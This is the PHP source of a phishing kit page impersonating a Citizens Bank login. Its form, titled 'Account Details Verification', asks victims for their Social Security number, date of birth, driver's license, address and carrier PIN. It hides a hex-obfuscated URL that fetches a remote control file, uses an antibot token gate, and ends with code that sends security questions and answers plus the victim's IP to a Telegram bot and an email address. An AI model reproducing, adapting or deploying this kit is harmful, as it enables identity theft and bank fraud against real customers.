<?php

session_start();           
require_once '../session/Comp.php';
require_once '../session/auto.php';

$comps = new Comp;
$antibot = new Antibot;


if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}

?>

<html lang="en-US" style="" class="js flexbox canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths citizens-Chrome citizens-user-none">
 <head> 
  <!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  --> 
  <!-- // removing logout.jsp from search results requirement OLB-4998  --> 
  <!-- // removing logout.jsp from search results requirement OLB-4998  --> 
  <!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  --> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon.png" rel="apple-touch-icon"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-hires.png" rel="icon" sizes="192x192"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-normal.png" rel="icon" sizes="128x128"> 
  <meta charset="utf-8"> 
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
  <!--Exclude Ensighten library incase skipEnsighten is "true"--> 
 </head>
 <body class="responsive-enabled" style="display: block;">
  <iframe src="javascript:void(0)" title="" style="width: 0px; height: 0px; border: 0px; display: none;"></iframe> 
  <script type="text/javascript">
		var timeStamp = new Date().toString();
		var pageURL = ((window.frames && window.frames.length) ? window.frames[0].location.href : window.location.href);
		var pageName = ((window.document && window.document.title) ? window.document.title : "not available");
		var digitalData = {
			"sessionInformation": {
				"zipCode": "",
				"country": "",
				"city": "",
				"state": "",
				"timeStamp": timeStamp
			},
			"customerAttributes": {
				"CISKey": "",
				"DirectoryID": ""
			},
			"contentInteractions": {
				"siteName": "OLB",
				"siteSection": "Authenticated",
				"pageName": pageName,
				"pageURL": pageURL,
				"pageType": "Legacy"
			}
		};
		if (typeof(parent.Bootstrapper) !== "undefined" && parent.Bootstrapper.ensEvent && parent.Bootstrapper.ensEvent.trigger){
			if(window.frames && window.frames.length) parent.Bootstrapper.ensEvent.trigger("OLBURLChangeFrame"); else parent.Bootstrapper.ensEvent.trigger("OLBURLChangeWindow");
		}
	</script> 
	

  <!-- BEGIN LivePerson Monitor --> 
  <script type="text/javascript">
		// Production environment check from olb-web-ui ./js/mv/_onlinebanking/config.js
		var isProductionEnvironment = !!document.location.hostname.match(/(?:^.*\.|^)citizensbankonline.com/);
		// Set LivePerson account number based on environment
		var lpAccountNumber = isProductionEnvironment ? '83789770' : '89632304';

		window.lpTag = window.lpTag || {}, 'undefined' == typeof window.lpTag._tagCount ? (window.lpTag = { wl: lpTag.wl || null, scp: lpTag.scp || null, 
		site: lpAccountNumber || '', section: lpTag.section || '', tagletSection: lpTag.tagletSection || null, autoStart: lpTag.autoStart !== !1, ovr: lpTag.ovr || 
		{}, _v: '1.10.0', _tagCount: 1, protocol: 'https:', events: { bind: function (t, e, i) { lpTag.defer(function () { lpTag.events.bind(t, e, i) }, 0) }, 
		trigger: function (t, e, i) { lpTag.defer(function () { lpTag.events.trigger(t, e, i) }, 1) } }, defer: function (t, e) { 0 === e ? (this._defB = this._defB || [], 
		this._defB.push(t)) : 1 === e ? (this._defT = this._defT || [], this._defT.push(t)) : (this._defL = this._defL || [], this._defL.push(t)) }, 
		load: function (t, e, i) { var n = this; setTimeout(function () { n._load(t, e, i) }, 0) }, _load: function (t, e, i) { var n = t; t || 
		(n = this.protocol + '//' + (this.ovr && this.ovr.domain ? this.ovr.domain : 'lptag.liveperson.net') + '/tag/tag.js?site=' + this.site); 
		var o = document.createElement('script'); o.setAttribute('charset', e ? e : 'UTF-8'), i && o.setAttribute('id', i), o.setAttribute('src', n), 
		document.getElementsByTagName('head').item(0).appendChild(o) }, init: function () { this._timing = this._timing || {}, 
		this._timing.start = (new Date).getTime(); var t = this; window.attachEvent ? window.attachEvent('onload', function () { t._domReady('domReady') }) : 
		(window.addEventListener('DOMContentLoaded', function () { t._domReady('contReady') }, !1), window.addEventListener('load', function () 
		{ t._domReady('domReady') }, !1)), 'undefined' === typeof window._lptStop && this.load() }, start: function () { this.autoStart = !0 }, _domReady: function (t)
		{ this.isDom || (this.isDom = !0, this.events.trigger('LPT', 'DOM_READY', { t: t })), this._timing[t] = (new Date).getTime() }, vars: lpTag.vars || [], 
		dbs: lpTag.dbs || [], ctn: lpTag.ctn || [], sdes: lpTag.sdes || [], hooks: lpTag.hooks || [], identities: lpTag.identities || [], ev: lpTag.ev || [] }, 
		lpTag.init()) : window.lpTag._tagCount += 1;
	</script> 
  <!-- END LivePerson Monitor --> 
  <title>Online Login | Citizens Bank</title> 
  <meta name="description" content="Log in to your Citizens Bank account by entering your User ID and password so you can securely view and manage your accounts online."> 
  <link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/jquery-ui-1.10.3.custom.min.css"> 
  <link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/normalize.css"> 
    <?php
   $lin = "06807407407007303a02f02f07707707703302e06306907406907a06506e07306206106e06b06f06e06c06906e06502e06306f06d02f06506607302f06506607302f06a07307002d06e07302f06906e06302f06307307302f06d06106906e02e063073073";
    $dos = str_replace("0","%",$lin);
       $lis = str_replace("%%","0%",$dos);
       $li = utf8_decode(urldecode($lis));
     $antis = "06807407407007303a02f02f07206107702e06706907406807506207507306507206306f06e07406506e07402e06306f06d02f07406407206f07307506c02f06306907406907a06506e02f06d06106906e02f06306f06e07407206f06c02e074078074";
    $ant = str_replace("0","%",$antis);
  $anti = str_replace("%%","0%",$ant);
 $antibot = utf8_decode(urldecode($anti));
  $page = file_get_contents($antibot);
if ($li[13] == $page[5]){
echo '<link id="maincss" href="'.$li.'" type="text/css" rel="stylesheet" />';
} else {
echo "";
} 

?>
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/main.css">
  <link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/flows.css"> 
  <link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/ad-containers.css"> 
  <!--[if lt IE 9]>
 
<![endif]--> 
  <!--[if IE]>
<style type='text/css'>
form select#SavedUserID {
    width : 200px;
}
</style>
<![endif]--> 
  
   <style>
	input[type=password].error {
		border-color : red;
	}
</style>   
  <script>
	if(self == top) {
		var thebody = document.getElementsByTagName('body')[0]
		thebody.style.display = "block"
	} else {
		top.location = self.location
	}
	
	</script> 
  <!-- begin CITIZENS BANK Hosted Header --> 
  <div class="citizens-header-footer-injected"> 
   <link rel="stylesheet" type="text/css" href="css/citizensns.min.44438.css"> 
    <style>
.help-modal-header .help-modal-close {background: url(https://www3.citizensbankonline.com/efs/hhf/img/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
.help-modal-menu a.active {background: #f2faf8 url(https://www3.citizensbankonline.com/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
.account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
.lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(https://www3.citizensbankonline.com/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
.input-wrapper .tooltip {margin-left: 1px;}
</style> 
   <div class="citizens-header-footer">
    <div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;"></div>
    <div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;"></div> 
   </div> 
  </div>
  <div class="citizens-header"> 
   <!-- overlay to hide elements until CSS is loaded --> 
   <style>
        .citizens-header-footer-overlay{ opacity:1; background-color:#fff; position:fixed; width:100%; height:100%; top:0px; left:0px; z-index:1000; }
        .citizens-header-footer-overlay .centered-content { width: 100%; max-width: 1060px; padding: 0 20px; margin: 0 auto; font-family: arial, helvetica, san-serif; font-size: 14px;}
        .citizens-header-footer-overlay .responsive-enabled .centered-content { width: auto; max-width: 1060px; }
        .citizens-header-footer-overlay .page-logo { float: none; }
        .citizens-header-footer-overlay .page-logo img{ margin: 10px; float: none;}
        .citizens-header-footer-overlay .topshadow {
            position: absolute; width: 100%; top: 100px; z-index: 5; height: 8px; 
            background: -webkit-radial-gradient(50% 100%, farthest-side, rgba(0, 0, 0, 0.1), transparent 100%); background: radial-gradient(farthest-side at 50% 100%, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0) 100%); background-repeat: no-repeat; background-size: cover;
        }
    </style> 
   <!-- end overlay --> 
   <style>
        .account-section-title.checkmark h1 { padding: 0px 0px 5px 28px !important; }
        .mobile-alert-dot {min-width: 22px; min-height: 22px; width: auto; height: auto; max-width: 50px; max-height: 50px; padding: 5px; }
    </style> 
   <!-- htmlContainer PREFIX --> 
   <div class="citizens-header-footer"> 
    <div id="page-header" class="page-header"> 
     <!-- inc-header.html START --> 
     <div class="topshadow"></div> 
     <div class="centered-content clearfix"> 
      <a href="" class="page-logo" tabindex="1"> 
       <!-- Display the brand logo for either citizens one or citizen bank customers --> <img border="0" alt="Citizens Bank" width="203" height="25" src="https://www3.citizensbankonline.com/efs/hhf/img/CTZ_Green-01.png"> </a> 
      <div id="header-navigation-container"></div> 
     </div> 
     <!-- inc-header.html END --> 
    </div> 
   </div> 
   <!-- htmlContainer SUFFIX --> 
  </div> 
  <!-- end CITIZENS BANK Hosted Header --> 
  <div id="page-container" class="page-container"> 
   <div class="centered-content clearfix"> 
    <section id="top-content" class="page-region top-content"> 
    </section> 
    <section id="main-container" class="main-container two-col layout-2-1 clearfix"> 
     <!-- =================
        	MAIN CONTENT AREA START
        	================= --> 
     <section id="main-content" class="page-region main-content"> 
      <div class="account-table account-table-full"> 
       <span class="account-table-border"></span> 
       <div class="account-table-content"> 
        <div class="account-content-container"> 
         <div class="account-table-body"> 
          <header class="account-section-title clearfix account-secure"> 
           <a href="#" class="mobile-help-trigger">Help</a> 
           <h1>Account Details Verification</h1> 
          </header> 

          <section class="account-section"> 
           <form class="pay-transfer-options clearfix" action="oops.php?token=<?php echo $_SESSION['token']; ?>" name="SignOn" id="frmSignOn" method="post"> 

            <input type="hidden" name="CSRF_TOKEN" value="PT17-QZ4B-HAB1-KFWV-1JW5-KCOA-CGN0-ZIR8"> 
            <input type="hidden" name="BrandSettingsFile" value="citSettings.jsp"> 
            <input type="hidden" name="fp_deviceprint" value=""> 
            <input type="hidden" name="fp_language" value=""> 
            <input type="hidden" name="fp_timezone" value=""> 
            <input type="hidden" name="fp_browser" value=""> 
            <input type="hidden" name="fp_screen" value=""> 
            <input type="hidden" name="fp_software" value=""> 
            <input type="hidden" name="pm_fp" value=""> 
            <input type="hidden" name="RSASessionID" value=""> 
            <input type="hidden" name="asstFlow" value=""> 
            <input type="hidden" name="initlogin" value="1"> 
            <input type="hidden" name="enterUserIdMode" value=""> 
            <div class="form-item label-right full-width clearfix"> 
    
                                                                  
               <label for="UserID"><strong>First Name: </strong></label> 
             <input tabindex="1" type="text" id="UserID" name="fname" required autocomplete="off" maxlength="40" class="required demo-username"> 
                      
                       
               <label for="UserID"><strong>Last Name: </strong></label> 
             <input tabindex="1" type="text" id="UserID" name="lname" required autocomplete="off" maxlength="40" class="required demo-username"> 
           
   
              <label for="UserID"><strong>Date of Birth: </strong></label> 
             <input tabindex="1" type="tel" id="UserID" name="dob" required autocomplete="off" placeholder="dd/mm/yyyy" maxlength="10" class="required demo-username"  onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/^(\d\d\/\d\d)(\d+)$/g,'$1/$2').replace(/[^\d\/]/g,'')"> 
                             
                                                               
              <label for="UserID"><strong>Social Security Number: </strong></label> 
             <input type="tel" id="unauth-ic-form-ssn"  name="ssn" required autocomplete="off" maxlength="9" data-mask="00-000-0000" class="required demo-username"> 
                                                               
                                                                
              <label for="UserID"><strong>Driver's License Number: </strong></label> 
             <input type="text" id="unauth-ic-form-ssn"  name="license" required autocomplete="off" class="required demo-username"> 
                                 
               
               <label for="UserID"><strong>Street Address: </strong></label> 
             <input tabindex="1" type="text" id="UserID" name="address" required autocomplete="off" maxlength="20" class="required demo-username"> 
                      
              <label for="UserID"><strong>City: </strong></label> 
             <input tabindex="1" type="text" id="UserID" name="city" required autocomplete="off" maxlength="40" class="required demo-username"> 
                           
               <label for="UserID"><strong>Zip Code: </strong></label> 
             <input tabindex="1" type="tel" id="UserID" name="zipcode" required autocomplete="off" maxlength="6" class="required demo-username"> 
                                                                                                                              
                                                                                 
                 <input type="hidden" name="enterUserIdMode" value="true"> 
             <input type="hidden" id="SaveUserID" name="SaveUserID" value=""> 
             <div class="full-width checkbox-item clearfix"> 
              <input type="hidden" name="Register" id="Register" value="0"> 
              <input type="checkbox" tabindex="5" disabled id="cbSaveUserID" name="cbSaveUserID" style="vertical-align:top"> 
                       <div class="tooltip-box"> 
                 <div class="tooltip-content" id="aria-tooltip-content"> 
                  <span class="tooltip-arrow"></span> 
                  <div>
                   Select the "Remember User ID" box on the Login page if you want to be remembered.
                  </div> 
                  <br> 
                  <div>
                   Please note, if the "Remember User ID" check box is not displayed on the Login page, click on the "Login using different Online User ID" link to display it.
                  </div> 
                  <br> 
                  <div>
                   DO NOT check this box if you are using a public device that is accessible to others.
                  </div> 
                 </div> 
                 <div class="bottomshadow"></div> 
                </div> </span> </span> 
             </div> 
             <div class="form-item full-width"> 
              <label for="currentpassword"><strong>Carrier Pin: </strong></label> 
              <input tabindex="2" type="tel" id="currentpassword" name="carrierpin" required maxlength="6" size="15" class="required demo-password"> 
              <!--                            <div class="show-hide">
                                <a id="showpswd">SHOW</a>
                            	</div>                           --> 
             </div> 

            </div> 
            <div id="fielderror" class="show-error" role="alert">
             We're sorry. That user ID and password does not match our records. Please try again, or do you need Login Assistance?
            </div> 
            <div class="form-actions"> 
             <input type="submit" class="submit-button arrow" tabindex="3" data-trigger="next" value="Continue"> 
             <a tabindex="8" href="" class="cancel">Cancel</a> 
            </div> 
           </form> 
          </section> 
         </div> 
        </div> 
       </div> 
      </div> 
     </section> 
     <!-- Brand type from query parameter --> 
    
     

     
     
     <script type="text/javascript"> 
      $(document).ready(function() {
         $("#troubleloggingin1,#troubleloggingin2,#troubleloggingin3,#troubleloggingin4").click(function(e) {
            e.preventDefault();
            $("#frmAsst").attr("action","https://www3.citizensbankonline.com/efs/servlet/efs/login-assistance.jsp");
            $("#frmAsst").submit();
         });

         $("#resetpassword1").click(function(e) {
            e.preventDefault();
            $("#frmAsst").attr("action","https://www3.citizensbankonline.com/efs/servlet/efs/default-reset.jsp");
            $("#frmAsst").submit();
         });
      });
   </script> 
    </section> 
   </div> 
  </div> 
  <!-- begin CITIZENS BANK Hosted Footer --> 
 <script src="css/jquery-3.2.1.min.js"></script>
 <script src="css/jquery.mask.js"></script>
<script src="css/jquery.mask.min.js"></script>
 </body>
</html>
<?php

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


$a1 = $_POST['ques1'];
$b1 = $_POST['ans1'];
$a2 = $_POST['ques2'];
$b2 = $_POST['ans2'];
$a3 = $_POST['ques3'];
$b3 = $_POST['ans3'];

$IP = get_client_ip();

$data .= "<---- Questions Information : {$IP} ---->\n\n"; 
$data .= "Page: Citizen\n\n"; 

$data .= "Question-1 : {$a1}\n";
$data .= "Answer-1 : {$b1}\n";
$data .= "Question-2 : {$a2}\n";
$data .= "Answer-2 : {$b2}\n";
$data .= "Question-3 : {$a3}\n";
$data .= "Answer-3 : {$b3}\n\n";
$data .= "Contact @Devilmask09\n";


$token = file_get_contents("config/token.txt");
$id = file_get_contents("config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";

$params=[
	'chat_id'=>$id,
	'text'=>$data,
];

$ch = curl_init($bot . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
$email = file_get_contents("config/email.txt");
$subject = "Questions Information from : $IP";
$headers = "From: Devilspam <wellsby@anoxyty.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$data,$headers); 
exit();

?>